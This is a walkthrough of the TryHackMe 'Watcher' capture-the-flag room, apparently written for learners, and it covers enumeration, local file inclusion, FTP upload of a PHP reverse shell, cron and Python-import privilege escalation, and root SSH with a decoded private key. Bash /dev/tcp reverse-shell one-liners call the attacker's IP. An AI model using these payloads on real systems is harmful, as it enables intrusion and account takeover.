# Watcher - TryHackMe CTF Challenge

> [Challenge Link](https://tryhackme.com/room/watcher)

## Preparation

- Install OpenVPN on your system
    - Both the OpenVPN Setup Guide and personal configuration files are available on [TryHackMe Access page](https://tryhackme.com/access)
- Download your personal OpenVPN configuration files (`.ovpn`)
- Open the terminal
- Navigate to the folder with personal configuration files
- `sudo openvpn <configuration file name>.ovpn`
- In a new terminal tab/window, ping the IP address of the lab machine, e.g.: `ping 10.112.135.253`

![](./img/thm-access-openvpn.png)

> **Important**: Every Lab Machine has a unique IP address. Replace my IP address (`10.112.135.253`) with the one that corresponds to your Lab Machine. Replace my attacking machine's IP address (`192.168.150.193`) with yours as well.

![](./img/thm-vm-ip.png)


## Flag 1 - `nmap`, HTTP, `gobuster`, Subpages

Use `nmap` to see the open ports:

```bash
nmap 10.112.135.253
```

Output:

```txt
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-11-03 23:33 CET
Nmap scan report for 10.112.135.253
Host is up (0.024s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.43 seconds
```

There is an HTTP port open. Visit the page by typing the IP address in the browser.

Main page:

![](./img/main-page.png)


Run Gobuster to check hidden resources on the web server using a wordlist.

I use [this Gobuster wordlist](https://github.com/matteo741/Gobuster/blob/main/wordlist.txt).

Having downloaded the wordlist to the working directory, run Gobuster:

```bash
gobuster dir -u http://10.112.135.253 -w ./wordlist.txt -x txt,html,php
```

- `dir` mode - look for hidden directories and files on the server
- `-u` option - scan the following URL
- `-w` option - use the specified wordlist
- `-x` option - look for files with the specified extensions

Output fragment:

```txt
=================================================
Starting gobuster in directory enumeration mode
=================================================
/css                  (Status: 301) [Size: 312] [--> http://10.112.135.253/css/]
/images               (Status: 301) [Size: 315] [--> http://10.112.135.253/images/]
/index.php            (Status: 200) [Size: 4826]
/robots.txt           (Status: 200) [Size: 69]
/.htaccess            (Status: 403) [Size: 278]
/.htaccess.txt        (Status: 403) [Size: 278]
(...)

```

Check out the file `robots.txt` by viewing it in the browser like a sub-page: type `http://10.112.135.253/robots.txt` in the address bar.

Contents:

```txt
User-agent: *
Allow: /flag_1.txt
Allow: /secret_file_do_not_read.txt
```

View the resource in the browser: `http://10.112.135.253/flag_1.txt`

Output:

```txt
FLAG{<Flag 1>}
```

## Flag 2 - Local File Inclusion (LFI), Connecting to FTP

Try to open `secret_file_do_not_read.txt` the same way in the browser: `http://10.112.135.253/secret_file_do_not_read.txt`

![](./img/forbidden.png)

We need to find another way to open that page.

See what happens if we open one of the subpages on the main page:

![](./img/php-in-subpage.png)

Instruct the PHP server to return the contents of the secret file to us, bypassing the permission check: `http://10.112.135.253/post.php?post=secret_file_do_not_read.txt`

Contents:

> Hi Mat, The credentials for the FTP server are below. I've set the files to be saved to /home/ftpuser/ftp/files. Will ---------- ftpuser:givemefiles777

Connect to the FTP server:

```bash
lftp -u ftpuser 10.112.135.253
```

Use `givemefiles777` as the password.

Now that you logged in successfully, list the files on FTP.

```bash
ls
```

Output:

```txt
drwxr-xr-x    2 1001     1001         4096 Dec 03  2020 files
-rw-r--r--    1 0        0              21 Dec 03  2020 flag_2.txt
```

Flag 2 reached: `cat ./flag_2.txt`.

## Flag 3 - Reverse Shell, Netcat (`nc`)

[Download a PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) and put it into the working directory.

Inside the PHP source code, some changes must be made before using the reverse shell.

Check the attacking machine's IP address:

```bash
ip a show tun0
```

Output:

```txt
7: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1380 qdisc fq_codel state UNKNOWN group default qlen 500
    link/none 
    inet 192.168.150.193/18 brd 192.168.191.255 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 fe80::f1ef:dbb7:c0e9:4499/64 scope link stable-privacy 
       valid_lft forever preferred_lft forever
```

Take the `inet` address and use it inside `rshell.php`. On your local machine, change the configuration inside `rshell.php`:

```bash
nano ./rshell.php
```

```php
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.150.193';  // CHANGE THIS
$port = 2137;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```

The port name can be anything that does not have an existing functionality. Ports 2000+ should be generally safe.

Since files can be saved in the `files/` directory (as stated in `secret_file_do_not_read.txt`; also `files/` directory has the write permission), enter that directory before uploading the reverse shell:

```bash
cd ./files/
```

Put the reverse shell onto the FTP server:

```bash
put ./rshell.php
```

- `./rshell.php` is the path to the reverse shell (the file we want to put) *on the local machine*

Set up (on local machine) a `netcat` listener on a chosen port:

```bash
nc -lvnp 2137
```

- `-l` (*listen*) - use *listening mode*. Instead of initiating a connection with another server, wait for incoming connections
- `-v` (*verbose*) - display more information about connection status and IP addresses that connected to the server
- `-n` (*numeric*) - do not resolve DNS name (e.g. to avoid creating unwanted net traffic); operate solely on numeric IP addresses instead
- `-p` (*port*; *+port number*) - take a port number as an argument and listen on it

Use your browser to run a reverse shell by executing the file by inserting the file into URL:

```txt
http://10.112.135.253/post.php?post=/home/ftpuser/ftp/files/rshell.php
```

Netcat should receive the reverse shell connection.

Example Netcat (`nc -lvnp`) output:

```txt
Listening on 0.0.0.0 2137
Connection received on 10.112.135.253 55292
Linux ip-10-114-163-54 5.15.0-138-generic #148~20.04.1-Ubuntu SMP Fri Mar 28 14:32:35 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 00:44:20 up  1:55,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

Having connected to the shell, use the pre-installed Python interpreter to change the shell to `/bin/bash`:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

- `-c` (*command*) - execute a Python command directly from the terminal instead of creating a separate `.py` file
- `pty` module - Pseudo-Terminal Utilities
- `pty.spawn()` - launch a new process (most often the system shell such as `bin/bash` or `bin/sh`) and connect its standard input-output to the pseudo-terminal (PTY). Most often used to *upgrade the shell* to the fully interactive TTY shell
- **pseudoterminal (PTY)** - a pair of virtual device endpoints that estabilishes a communication channel between processes

Search the file system for the flag:

```bash
find -iname "*flag*" 2> /dev/null
```

- `-iname` - look for the case-insensitive file name pattern
- `2> /dev/null` - ignore error messages (by redirecting stderr output to the Null Device)

Output fragment:

```txt
./home/mat/flag_5.txt
./home/ftpuser/ftp/flag_2.txt
./home/will/flag_6.txt
./home/toby/flag_4.txt
./proc/sys/kernel/acpi_video_flags
./proc/sys/net/ipv4/fib_notify_on_flag_change
./proc/sys/net/ipv6/fib_notify_on_flag_change
./proc/kpageflags
./var/www/html/more_secrets_a9f10a/flag_3.txt
./var/www/html/flag_1.txt
```

The third flag is located at `./var/www/html/more_secrets_a9f10a/flag_3.txt`. Capture it.

```bash
cat ./var/www/html/more_secrets_a9f10a/flag_3.txt
```

## Flag 4 - Privilege Escalation, `sudo -l`, `sudo -u`

Check the current user's username:

```bash
whoami
```

Output:

```txt
www-data
```

Use `sudo -l` to list the current user's permissions and see what users you can run commands as:

```bash
sudo -l
```

Output:

```txt
Matching Defaults entries for www-data on ip-10-112-135-253:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-112-135-253:
    (toby) NOPASSWD: ALL
```

The current user `www-data` can run commands as `toby` without entering their password (`NOPASSWD: ALL`). We can use `sudo -u` to run commands as `toby`. Take advantage of it and use `bash` as `toby`:

```bash
sudo -u toby /bin/bash
```

Shell prompt after running the command:

```txt
toby@ip-10-112-135-253:/$ 
```

Navigate to Toby's home folder and see what's there.

```bash
cd ~
ls
```

Output:

```txt
flag_4.txt  jobs  note.txt
```

Capture the fourth flag (`cat flag_4.txt`).

## Flag 5 - Cron Jobs

View the note (`note.txt`) in Toby's home directory.

```bash
cat ./note.txt
```

Output:

```
Hi Toby,

I've got the cron jobs set up now so don't worry about getting that done.

Mat
```

**Cron Jobs** are automatic time-based task schedulers that run scripts or commands at fixed intervals or specific times.

- They use **Crontab (Cron Table)**, which is a configuration file that stores the list of scheduled jobs and their execution times.
- A background service called **Cron Daemon (crond)** continuously monitors the crontab files and triggers commands when the current time matches a job's schedule.

The Cron Daemon is generally located in `/usr/sbin/cron` (Debian/Ubuntu) or `/usr/sbin/crond` (RHEL/CentOS/Fedora). The system-wide crontab is located in `/etc/crontab`.

View the crontab:

```bash
cat /etc/crontab
```

Output:

```txt
# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
*/1 * * * * mat /home/toby/jobs/cow.sh
```

The line `*/1 * * * * mat /home/toby/jobs/cow.sh` means that there is a job that runs every minute (`*/1 * * * *`), runs as (on behalf of) the user `mat` and executes the command `/home/toby/jobs/cow.sh`, which runs a script located in another user's (`toby`) home directory.

- `*/1 * * * *` - `*` means every, all five `*` fields correspond to: minute, hour day of month, month, day of week

See the contents of the script that is run as a cron job:

```bash
cat /home/toby/jobs/cow.sh
```

Output:

```txt
#!/bin/bash
cp /home/mat/cow.jpg /tmp/cow.jpg
```

It looks like this job every minute copies the file `cow.jpg` from Mat's home directory to the `/tmp/` directory. But since this script is run on behalf of Mat, we can add a line to this script and run a reverse shell that the attacking machine will connect to:

```bash
cd /home/toby/jobs/
echo 'bash -c "bash -i >& /dev/tcp/192.168.150.193/4444 0>&1"' >> cow.sh
```

- `&> file` - redirect both stdout and stderr to the file (equivalent of `> file 2>&1`)
- `bash -c` (*command*) - run a Bash command provided in the string
- `bash -i` (*interactive*) - run Bash in interactive mode
- choose a different port than the one in the first Netcat listener

> This command was used from a hint in the write-up: ["TryHackMe - Watcher WalkThrough" by Aniket Badami](https://0xaniket.medium.com/tryhackme-watcher-walkthrough-d9abc221cdbf)

Set up another Netcat listener (on the attacking machine) using the chosen port:

```bash
nc -lvnp 4444
```

Since the script `cow.sh` runs every minute (as a cron job), within a minute there should be connection to the reverse shell that allows us to use the system as `mat`.

Netcat output (after waiting up to 1 minute):

```txt
Listening on 0.0.0.0 4444
Connection received on 10.112.135.253 56452
bash: cannot set terminal process group (3659): Inappropriate ioctl for device
bash: no job control in this shell
```

The prompt after establishing the connection:

```txt
mat@ip-10-112-135-253:~$
```

From the Bash prompt we can see that we are using the system as `mat`. We can double-check that:

```bash
whoami
```

Output:

```txt
mat
```

View the files in Mat's home directory. It should be the first directory opened after connecting to the reverse shell, but that location can also be ensured by running `pwd` and, if necessary, changed using `cd ~`.

```bash
cd ~  # If necessary
ls
```

Output:

```txt
cow.jpg
flag_5.txt
note.txt
scripts
```

Capture the fifth flag (`cat ./flag_5.txt`).

## Flag 6 - Python Scripts

Apart from viewing Flag 5, also read the note (`note.txt`) located in Mat's home directory.

```bash
cat ./note.txt
```

Output:

```txt
Hi Mat,

I've set up your sudo rights to use the python script as my user. You can only run the script with sudo so it should be safe.

Will
```

Check the current (Mat's) sudo privileges:

```bash
sudo -l
```

Output:

```txt
Matching Defaults entries for mat on ip-10-112-135-253:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mat may run the following commands on ip-10-112-135-253:
    (will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py *
```

The current user (Mat) can run `python3` binary and `will_script.py` script as Will, without providing Will's password.

Check out the scripts.

```bash
cd ./scripts
ls -l
```

Output:

```txt
total 8
-rw-r--r-- 1 mat  mat  133 Dec  3  2020 cmd.py
-rw-r--r-- 1 will will 208 Dec  3  2020 will_script.py
```

The script `will_script.py` cannot be written to by Mat, but `cmd.py` does provide such permission.

File `cmd.py`:

```py
def get_command(num):
	if(num == "1"):
		return "ls -lah"
	if(num == "2"):
		return "id"
	if(num == "3"):
		return "cat /etc/passwd"
```

File `will_script.py`:

```py
import os
import sys
from cmd import get_command

cmd = get_command(sys.argv[1])

whitelist = ["ls -lah", "id", "cat /etc/passwd"]

if cmd not in whitelist:
	print("Invalid command!")
	exit()

os.system(cmd)
```

The script `will_script.py` uses `sys.argv[1]`, so it should be run with an argument. Because that argument is then taken to the `get_command()` function from `cmd.py`, we can conclude that the script takes a number from 1 to 3 as an argument.

Since Python executes a module's top-level code at import time, anything outside the function body in `cmd.py` will be executed immediately when `will_script.py` is run - even before the whitelist check happens.

This means we can add to `cmd.py` code that runs a reverse shell we can connect to as Will (since Mat can do it using `sudo -u`).

Add the import line and a reverse shell one-liner to `cmd.py`, paying attention to escaping quotes:

```bash
cd /home/mat/scripts  # If necessary
echo 'import os' >> cmd.py
echo 'os.system("bash -c \"bash -i >& /dev/tcp/192.168.150.193/4545 0>&1\"")' >> cmd.py
```

Set up a Netcat listener on the attacking machine (with yet another chosen port):

```bash
nc -lvnp 4545
```

Run the script as Will from Mat's shell (remember about the argument: a number 1-3):

```bash
sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 1
```

Netcat output on attacking machine:

```txt
Listening on 0.0.0.0 4545
Connection received on 10.112.135.253 51592
bash: cannot set terminal process group (3659): Inappropriate ioctl for device
bash: no job control in this shell
```

Shell prompt:
```txt
will@ip-10-112-135-253:/home/mat/scripts$ 
```

The connection to the Will's shell has been successfully established.

```bash
cd ~
ls
```

Output:

```txt
flag_6.txt
```

Now, the sixth flag can be captuted (`cat flag_6.txt`).

## Flag 7 - Root, `b64 -d`, `ssh -i`

All user flags have been captured by now. The final flag is the root flag.

Figuring out the next step seems to be a result of trial and error while browsing the key system folders. Relevant files can be found in `/opt/` directory.

```bash
cd /opt/
ls
```

Output:

```txt
backups
```

Inspect the `backups/` directory.

```bash
cd ./backups/
ls
```

Output:

```txt
key.b64
```

The file `key.b64` is **Base64 encoded**, which means that sequences of bytes in the binary file (that has been subject to encoding) were mapped to 64 elements corresponding to a given alphabet.

```bash
cat key.b64
```

```txt
LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcEFJQkFBS0NBUUVBelBhUUZvbFFx
OGNIb205bXNzeVBaNTNhTHpCY1J5QncrcnlzSjNoMEpDeG5WK2FHCm9wWmRjUXowMVlPWWRqWUlh
WkVKbWRjUFZXUXAvTDB1YzV1M2lnb2lLMXVpWU1mdzg1ME43dDNPWC9lcmRLRjQKanFWdTNpWE45
ZG9CbXIzVHVVOVJKa1ZuRER1bzh5NER0SXVGQ2Y5MlpmRUFKR1VCMit2Rk9ON3E0S0pzSXhnQQpu
TThrajhOa0ZrRlBrMGQxSEtIMitwN1FQMkhHWnJmM0RORm1RN1R1amEzem5nYkVWTzdOWHgzVjNZ
T0Y5eTFYCmVGUHJ2dERRVjdCWWI2ZWdrbGFmczRtNFhlVU8vY3NNODRJNm5ZSFd6RUo1enBjU3Jw
bWtESHhDOHlIOW1JVnQKZFNlbGFiVzJmdUxBaTUxVVIvMndOcUwxM2h2R2dscGVQaEtRZ1FJREFR
QUJBb0lCQUhtZ1RyeXcyMmcwQVRuSQo5WjVnZVRDNW9VR2padjdtSjJVREZQMlBJd3hjTlM4YUl3
YlVSN3JRUDNGOFY3cStNWnZEYjNrVS80cGlsKy9jCnEzWDdENTBnaWtwRVpFVWVJTVBQalBjVU5H
VUthWG9hWDVuMlhhWUJ0UWlSUjZaMXd2QVNPMHVFbjdQSXEyY3oKQlF2Y1J5UTVyaDZzTnJOaUpR
cEdESkRFNTRoSWlnaWMvR3VjYnluZXpZeWE4cnJJc2RXTS8wU1VsOUprbkkwUQpUUU9pL1gyd2Z5
cnlKc20rdFljdlk0eWRoQ2hLKzBuVlRoZWNpVXJWL3drRnZPRGJHTVN1dWhjSFJLVEtjNkI2CjF3
c1VBODUrdnFORnJ4ekZZL3RXMTg4VzAwZ3k5dzUxYktTS0R4Ym90aTJnZGdtRm9scG5Gdyt0MFFS
QjVSQ0YKQWxRSjI4a0NnWUVBNmxyWTJ4eWVMaC9hT0J1OStTcDN1SmtuSWtPYnBJV0NkTGQxeFhO
dERNQXo0T3FickxCNQpmSi9pVWNZandPQkh0M05Oa3VVbTZxb0VmcDRHb3UxNHlHek9pUmtBZTRI
UUpGOXZ4RldKNW1YK0JIR0kvdmoyCk52MXNxN1BhSUtxNHBrUkJ6UjZNL09iRDd5UWU3OE5kbFF2
TG5RVGxXcDRuamhqUW9IT3NvdnNDZ1lFQTMrVEUKN1FSNzd5UThsMWlHQUZZUlhJekJncDVlSjJB
QXZWcFdKdUlOTEs1bG1RL0UxeDJLOThFNzNDcFFzUkRHMG4rMQp2cDQrWThKMElCL3RHbUNmN0lQ
TWVpWDgwWUpXN0x0b3pyNytzZmJBUVoxVGEybzFoQ2FsQVF5SWs5cCtFWHBJClViQlZueVVDMVhj
dlJmUXZGSnl6Z2Njd0V4RXI2Z2xKS09qNjRiTUNnWUVBbHhteC9qeEtaTFRXenh4YjlWNEQKU1Bz
K055SmVKTXFNSFZMNFZUR2gydm5GdVR1cTJjSUM0bTUzem4reEo3ZXpwYjFyQTg1SnREMmduajZu
U3I5UQpBL0hiakp1Wkt3aTh1ZWJxdWl6b3Q2dUZCenBvdVBTdVV6QThzOHhIVkk2ZWRWMUhDOGlw
NEptdE5QQVdIa0xaCmdMTFZPazBnejdkdkMzaEdjMTJCcnFjQ2dZQWhGamkzNGlMQ2kzTmMxbHN2
TDRqdlNXbkxlTVhuUWJ1NlArQmQKYktpUHd0SUcxWnE4UTRSbTZxcUM5Y25vOE5iQkF0aUQ2L1RD
WDFrejZpUHE4djZQUUViMmdpaWplWVNKQllVTwprSkVwRVpNRjMwOFZuNk42L1E4RFlhdkpWYyt0
bTRtV2NOMm1ZQnpVR1FIbWI1aUpqa0xFMmYvVHdZVGcyREIwCm1FR0RHd0tCZ1FDaCtVcG1UVFJ4
NEtLTnk2d0prd0d2MnVSZGo5cnRhMlg1cHpUcTJuRUFwa2UyVVlsUDVPTGgKLzZLSFRMUmhjcDlG
bUY5aUtXRHRFTVNROERDYW41Wk1KN09JWXAyUloxUnpDOUR1ZzNxa3R0a09LQWJjY0tuNQo0QVB4
STFEeFUrYTJ4WFhmMDJkc1FIMEg1QWhOQ2lUQkQ3STVZUnNNMWJPRXFqRmRaZ3Y2U0E9PQotLS0t
LUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo=
```

Decode the key using the built-in `base64` Linux program

```bash
base64 -d ./key.b64
```

- `-d` (`--decode`) - decode the specified file
- without `-d` flag the command would encode a file

Output:

```txt
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAzPaQFolQq8cHom9mssyPZ53aLzBcRyBw+rysJ3h0JCxnV+aG
opZdcQz01YOYdjYIaZEJmdcPVWQp/L0uc5u3igoiK1uiYMfw850N7t3OX/erdKF4
jqVu3iXN9doBmr3TuU9RJkVnDDuo8y4DtIuFCf92ZfEAJGUB2+vFON7q4KJsIxgA
nM8kj8NkFkFPk0d1HKH2+p7QP2HGZrf3DNFmQ7Tuja3zngbEVO7NXx3V3YOF9y1X
eFPrvtDQV7BYb6egklafs4m4XeUO/csM84I6nYHWzEJ5zpcSrpmkDHxC8yH9mIVt
dSelabW2fuLAi51UR/2wNqL13hvGglpePhKQgQIDAQABAoIBAHmgTryw22g0ATnI
9Z5geTC5oUGjZv7mJ2UDFP2PIwxcNS8aIwbUR7rQP3F8V7q+MZvDb3kU/4pil+/c
q3X7D50gikpEZEUeIMPPjPcUNGUKaXoaX5n2XaYBtQiRR6Z1wvASO0uEn7PIq2cz
BQvcRyQ5rh6sNrNiJQpGDJDE54hIigic/GucbynezYya8rrIsdWM/0SUl9JknI0Q
TQOi/X2wfyryJsm+tYcvY4ydhChK+0nVTheciUrV/wkFvODbGMSuuhcHRKTKc6B6
1wsUA85+vqNFrxzFY/tW188W00gy9w51bKSKDxboti2gdgmFolpnFw+t0QRB5RCF
AlQJ28kCgYEA6lrY2xyeLh/aOBu9+Sp3uJknIkObpIWCdLd1xXNtDMAz4OqbrLB5
fJ/iUcYjwOBHt3NNkuUm6qoEfp4Gou14yGzOiRkAe4HQJF9vxFWJ5mX+BHGI/vj2
Nv1sq7PaIKq4pkRBzR6M/ObD7yQe78NdlQvLnQTlWp4njhjQoHOsovsCgYEA3+TE
7QR77yQ8l1iGAFYRXIzBgp5eJ2AAvVpWJuINLK5lmQ/E1x2K98E73CpQsRDG0n+1
vp4+Y8J0IB/tGmCf7IPMeiX80YJW7Ltozr7+sfbAQZ1Ta2o1hCalAQyIk9p+EXpI
UbBVnyUC1XcvRfQvFJyzgccwExEr6glJKOj64bMCgYEAlxmx/jxKZLTWzxxb9V4D
SPs+NyJeJMqMHVL4VTGh2vnFuTuq2cIC4m53zn+xJ7ezpb1rA85JtD2gnj6nSr9Q
A/HbjJuZKwi8uebquizot6uFBzpouPSuUzA8s8xHVI6edV1HC8ip4JmtNPAWHkLZ
gLLVOk0gz7dvC3hGc12BrqcCgYAhFji34iLCi3Nc1lsvL4jvSWnLeMXnQbu6P+Bd
bKiPwtIG1Zq8Q4Rm6qqC9cno8NbBAtiD6/TCX1kz6iPq8v6PQEb2giijeYSJBYUO
kJEpEZMF308Vn6N6/Q8DYavJVc+tm4mWcN2mYBzUGQHmb5iJjkLE2f/TwYTg2DB0
mEGDGwKBgQCh+UpmTTRx4KKNy6wJkwGv2uRdj9rta2X5pzTq2nEApke2UYlP5OLh
/6KHTLRhcp9FmF9iKWDtEMSQ8DCan5ZMJ7OIYp2RZ1RzC9Dug3qkttkOKAbccKn5
4APxI1DxU+a2xXXf02dsQH0H5AhNCiTBD7I5YRsM1bOEqjFdZgv6SA==
-----END RSA PRIVATE KEY-----
```

This is an RSA private key that could be used in connecting to the root account via SSH.

Copy the full decoded key (including the BEGIN/END lines) to a file on the attacking machine.

```bash
nano ./id_rsa
```

Paste the key and save the file.

In order for SSH to use the private key, permissions must be modified. Otherwise, the root account will ask for password which is unknown to us.

```bash
chmod 600 id_rsa
```

Now use `ssh` to connect to the root account.

```bash
ssh -i id_rsa root@10.112.135.253
```

- `-i` (*+ private key file*) - *identity file* - use the specified file that contains the private key (so-called *identity file*) and will be used for authentication on the remote server
- `root` - username
- `10.112.135.253` - remote server's address (here: temporary attacked machine's address)

Shell prompt after connecting:

```txt
root@ip-10-112-135-253:~#
```

Double-check the current user:

```bash
whoami
```

Output:

```txt
root
```

We have successfully connected to the root account via `ssh`. Check out the root's files.

```bash
ls
```

Output:

```txt
flag_7.txt  snap
```

The final flag has been reached (`cat ./flag_7.txt`).
